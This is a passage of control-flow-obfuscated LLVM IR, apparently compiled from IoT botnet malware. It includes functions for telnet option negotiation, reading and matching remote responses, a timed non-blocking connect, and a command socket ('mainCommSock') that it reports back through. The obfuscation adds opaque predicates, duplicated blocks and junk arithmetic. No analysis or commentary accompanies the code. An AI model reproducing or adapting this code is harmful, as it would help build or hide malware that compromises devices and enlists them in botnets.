  %_35 = sub i64 0, %269
  %gen36 = add i64 %_35, %263
  %_37 = shl i64 %269, %263
  %270 = or i64 %269, %263
  store i64 %270, i64* %268, align 8
  %271 = load i32, i32* %5, align 4
  %_38 = shl i32 %271, 1
  %_39 = sub i32 0, %271
  %gen40 = add i32 %_39, 1
  %_41 = sub i32 0, %271
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 0, %271
  %gen44 = add i32 %_43, 1
  %_45 = sub i32 %271, 1
  %gen46 = mul i32 %_45, 1
  %_47 = sub i32 %271, 1
  %gen48 = mul i32 %_47, 1
  %272 = add nsw i32 %271, 1
  %273 = call i32 @select(i32 %272, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %273, i32* %12, align 4
  %274 = icmp sle i32 %273, 0
  br label %originalBB

originalBB49alteredBB:                            ; preds = %originalBB49, %65
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %85
  %275 = load i32, i32* @mainCommSock, align 4
  %276 = call i32 (i32, i8*, ...) @sockprintf(i32 %275, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0))
  %277 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %277, align 8
  %278 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %278, align 8
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %115
  %279 = load i32, i32* %5, align 4
  %280 = srem i32 %279, 64
  %281 = zext i32 %280 to i64
  %_58 = sub i64 0, 1
  %gen59 = add i64 %_58, %281
  %_60 = sub i64 0, 1
  %gen61 = add i64 %_60, %281
  %_62 = shl i64 1, %281
  %_63 = sub i64 0, 1
  %gen64 = add i64 %_63, %281
  %_65 = sub i64 0, 1
  %gen66 = add i64 %_65, %281
  %_67 = shl i64 1, %281
  %282 = shl i64 1, %281
  %283 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %284 = load i32, i32* %5, align 4
  %_68 = shl i32 %284, 64
  %285 = sdiv i32 %284, 64
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds [16 x i64], [16 x i64]* %283, i64 0, i64 %286
  %288 = load i64, i64* %287, align 8
  %_69 = sub i64 0, %288
  %gen70 = add i64 %_69, %282
  %_71 = shl i64 %288, %282
  %_72 = shl i64 %288, %282
  %_73 = sub i64 0, %288
  %gen74 = add i64 %_73, %282
  %_75 = sub i64 %288, %282
  %gen76 = mul i64 %_75, %282
  %_77 = sub i64 %288, %282
  %gen78 = mul i64 %_77, %282
  %_79 = shl i64 %288, %282
  %289 = or i64 %288, %282
  store i64 %289, i64* %287, align 8
  %290 = load i32, i32* %5, align 4
  %_80 = sub i32 %290, 1
  %gen81 = mul i32 %_80, 1
  %291 = add nsw i32 %290, 1
  %292 = call i32 @select(i32 %291, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %292, i32* %12, align 4
  %293 = icmp sle i32 %292, 0
  br label %originalBB57

originalBB85alteredBB:                            ; preds = %originalBB85, %152
  store i32 0, i32* %18, align 4
  %294 = load i8*, i8** %6, align 8
  store i8* %294, i8** %17, align 8
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %170
  %295 = load i32, i32* %7, align 4
  %_90 = sub i32 %295, -1
  %gen91 = mul i32 %_90, -1
  %296 = add nsw i32 %295, -1
  store i32 %296, i32* %7, align 4
  %297 = icmp sgt i32 %295, 1
  br label %originalBB89

originalBB95alteredBB:                            ; preds = %originalBB95, %190
  %298 = load i32, i32* @mainCommSock, align 4
  %299 = call i64 @recv(i32 %298, i8* %16, i64 1, i32 0)
  %300 = icmp ne i64 %299, 1
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %210
  %301 = load i8*, i8** %17, align 8
  store i8 0, i8* %301, align 1
  store i32 -1, i32* %4, align 4
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %236
  %302 = load i32, i32* %18, align 4
  %_104 = sub i32 0, %302
  %gen105 = add i32 %_104, 1
  %_106 = shl i32 %302, 1
  %_107 = sub i32 0, %302
  %gen108 = add i32 %_107, 1
  %_109 = sub i32 0, %302
  %gen110 = add i32 %_109, 1
  %_111 = shl i32 %302, 1
  %_112 = sub i32 %302, 1
  %gen113 = mul i32 %_112, 1
  %_114 = shl i32 %302, 1
  %_115 = shl i32 %302, 1
  %303 = add nsw i32 %302, 1
  store i32 %303, i32* %18, align 4
  br label %originalBB103
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #4

declare i64 @recv(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = load i32, i32* @x.47
  %7 = load i32, i32* @y.48
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 %0, i32* %15, align 4
  store i32 %1, i32* %16, align 4
  store i8* %2, i8** %17, align 8
  store i32 %3, i32* %18, align 4
  store i8** %4, i8*** %19, align 8
  %22 = load i8*, i8** %17, align 8
  %23 = load i32, i32* %18, align 4
  %24 = sext i32 %23 to i64
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 %24, i32 1, i1 false)
  %25 = load i32, i32* %15, align 4
  %26 = load i32, i32* %16, align 4
  %27 = load i8*, i8** %17, align 8
  %28 = load i32, i32* %18, align 4
  %29 = call i32 @read_with_timeout(i32 %25, i32 %26, i8* %27, i32 %28)
  store i32 %29, i32* %20, align 4
  %30 = load i8*, i8** %17, align 8
  %31 = getelementptr inbounds i8, i8* %30, i64 0
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %33, 255
  %35 = load i32, i32* @x.47
  %36 = load i32, i32* @y.48
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %34, label %43, label %47

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %15, align 4
  %45 = load i8*, i8** %17, align 8
  %46 = call i32 @negotiate(i32 %44, i8* %45, i32 3)
  br label %47

; <label>:47:                                     ; preds = %43, %originalBBpart2
  %48 = load i8*, i8** %17, align 8
  %49 = load i8**, i8*** %19, align 8
  %50 = call i32 @contains_string(i8* %48, i8** %49)
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %52, label %69

; <label>:52:                                     ; preds = %47
  %53 = load i32, i32* @x.47
  %54 = load i32, i32* @y.48
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 1, i32* %14, align 4
  %61 = load i32, i32* @x.47
  %62 = load i32, i32* @y.48
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %70

; <label>:69:                                     ; preds = %47
  store i32 0, i32* %14, align 4
  br label %70

; <label>:70:                                     ; preds = %69, %originalBBpart24
  %71 = load i32, i32* %14, align 4
  ret i32 %71

originalBBalteredBB:                              ; preds = %originalBB, %5
  %72 = alloca i32, align 4
  %73 = alloca i32, align 4
  %74 = alloca i32, align 4
  %75 = alloca i8*, align 8
  %76 = alloca i32, align 4
  %77 = alloca i8**, align 8
  %78 = alloca i32, align 4
  %79 = alloca i32, align 4
  store i32 %0, i32* %73, align 4
  store i32 %1, i32* %74, align 4
  store i8* %2, i8** %75, align 8
  store i32 %3, i32* %76, align 4
  store i8** %4, i8*** %77, align 8
  %80 = load i8*, i8** %75, align 8
  %81 = load i32, i32* %76, align 4
  %82 = sext i32 %81 to i64
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 %82, i32 1, i1 false)
  %83 = load i32, i32* %73, align 4
  %84 = load i32, i32* %74, align 4
  %85 = load i8*, i8** %75, align 8
  %86 = load i32, i32* %76, align 4
  %87 = call i32 @read_with_timeout(i32 %83, i32 %84, i8* %85, i32 %86)
  store i32 %87, i32* %78, align 4
  %88 = load i8*, i8** %75, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 0
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = icmp eq i32 %91, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 1, i32* %14, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !3
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = or i64 %37, %31
  store i64 %38, i64* %36, align 8
  %39 = load i32, i32* %6, align 4
  %40 = add nsw i32 %39, 1
  %41 = call i32 @select(i32 %40, %struct.__sigset_t* %10, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %11)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %43, label %44

; <label>:43:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %51

; <label>:44:                                     ; preds = %27
  %45 = load i32, i32* %6, align 4
  %46 = load i8*, i8** %8, align 8
  %47 = load i32, i32* %9, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @recv(i32 %45, i8* %46, i64 %48, i32 0)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %5, align 4
  br label %51

; <label>:51:                                     ; preds = %44, %43
  %52 = load i32, i32* %5, align 4
  ret i32 %52
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %125 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %127

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %118

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %101

; <label>:30:                                     ; preds = %23
  %31 = load i32, i32* @x.51
  %32 = load i32, i32* @y.52
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %30
  %39 = load i8*, i8** %6, align 8
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 3, %42
  %44 = load i32, i32* @x.51
  %45 = load i32, i32* @y.52
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %76

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.51
  %54 = load i32, i32* @y.52
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i8*, i8** %6, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 1
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 253
  %66 = select i1 %65, i32 251, i32 253
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %8, align 1
  %68 = load i32, i32* @x.51
  %69 = load i32, i32* @y.52
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %84

; <label>:76:                                     ; preds = %originalBBpart2
  %77 = load i8*, i8** %6, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 253
  %82 = select i1 %81, i32 252, i32 254
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %8, align 1
  br label %84

; <label>:84:                                     ; preds = %76, %originalBBpart24
  %85 = load i32, i32* @x.51
  %86 = load i32, i32* @y.52
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %84
  %93 = load i32, i32* @x.51
  %94 = load i32, i32* @y.52
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %101

; <label>:101:                                    ; preds = %originalBBpart28, %29
  %102 = load i32, i32* @x.51
  %103 = load i32, i32* @y.52
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* @x.51
  %111 = load i32, i32* @y.52
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %118

; <label>:118:                                    ; preds = %originalBBpart212, %22
  %119 = load i32, i32* %5, align 4
  %120 = call i64 @send(i32 %119, i8* %8, i64 1, i32 16384)
  %121 = load i32, i32* %5, align 4
  %122 = load i8*, i8** %6, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 2
  %124 = call i64 @send(i32 %121, i8* %123, i64 1, i32 16384)
  br label %126

; <label>:125:                                    ; preds = %3
  br label %126

; <label>:126:                                    ; preds = %125, %118
  store i32 0, i32* %4, align 4
  br label %127

; <label>:127:                                    ; preds = %126, %13
  %128 = load i32, i32* %4, align 4
  ret i32 %128

originalBBalteredBB:                              ; preds = %originalBB, %30
  %129 = load i8*, i8** %6, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 3, %132
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %134 = load i8*, i8** %6, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = load i8, i8* %135, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 253
  %139 = select i1 %138, i32 251, i32 253
  %140 = trunc i32 %139 to i8
  store i8 %140, i8* %8, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %81, %17
  %19 = load i32, i32* @x.53
  %20 = load i32, i32* @y.54
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %27, %28
  %30 = load i32, i32* @x.53
  %31 = load i32, i32* @y.54
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %84

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i32, i32* @x.53
  %40 = load i32, i32* @y.54
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8*, i8** %4, align 8
  %48 = load i8**, i8*** %5, align 8
  %49 = load i32, i32* %7, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8*, i8** %48, i64 %50
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %47, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = load i32, i32* @x.53
  %56 = load i32, i32* @y.54
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %54, label %63, label %80

; <label>:63:                                     ; preds = %originalBBpart24
  %64 = load i32, i32* @x.53
  %65 = load i32, i32* @y.54
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %63
  store i32 1, i32* %3, align 4
  %72 = load i32, i32* @x.53
  %73 = load i32, i32* @y.54
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:80:                                     ; preds = %originalBBpart24
  br label %81

; <label>:81:                                     ; preds = %80
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %7, align 4
  br label %18

; <label>:84:                                     ; preds = %originalBBpart2
  store i32 0, i32* %3, align 4
  br label %85

; <label>:85:                                     ; preds = %84, %originalBBpart28
  %86 = load i32, i32* @x.53
  %87 = load i32, i32* @y.54
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %85
  %94 = load i32, i32* %3, align 4
  %95 = load i32, i32* @x.53
  %96 = load i32, i32* @y.54
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %94

originalBBalteredBB:                              ; preds = %originalBB, %18
  %103 = load i32, i32* %7, align 4
  %104 = load i32, i32* %6, align 4
  %105 = icmp slt i32 %103, %104
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %106 = load i8*, i8** %4, align 8
  %107 = load i8**, i8*** %5, align 8
  %108 = load i32, i32* %7, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %106, i8* %111)
  %113 = icmp ne i32 %112, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %63
  store i32 1, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %85
  %114 = load i32, i32* %3, align 4
  br label %originalBB10
}

declare i32 @strcasestr(...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %155

; <label>:45:                                     ; preds = %37
  %46 = load i32, i32* @x.55
  %47 = load i32, i32* @y.56
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = call i32* @__errno_location() #13
  %55 = load i32, i32* %54, align 4
